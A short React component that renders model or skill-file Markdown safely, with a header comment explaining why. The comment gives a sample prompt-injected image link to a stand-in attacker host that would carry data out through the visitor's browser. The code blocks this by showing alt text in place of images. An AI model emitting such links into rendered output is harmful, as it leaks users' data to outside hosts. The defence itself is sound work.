/* Markdown from a model or a skill file, rendered without fetching anything.

   The text may be prompt-injected: `![x](https://attacker/?d=...)` would make the
   visitor's browser request an attacker's address with data in it. Images are
   never rendered - their alt text stands in - and links open in a new tab with
   rel="noopener noreferrer", so following one leaks neither this page nor its
   address. Raw HTML stays off (react-markdown's default) and URLs keep its
   default sanitising. */

import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'

const components: Components = {
  img: ({ alt }) => (alt ? <span className="markdown-image-alt">[{alt}]</span> : null),
  a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
}

export default function Markdown({ children }: { children: string }) {
  return <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>{children}</ReactMarkdown>
}
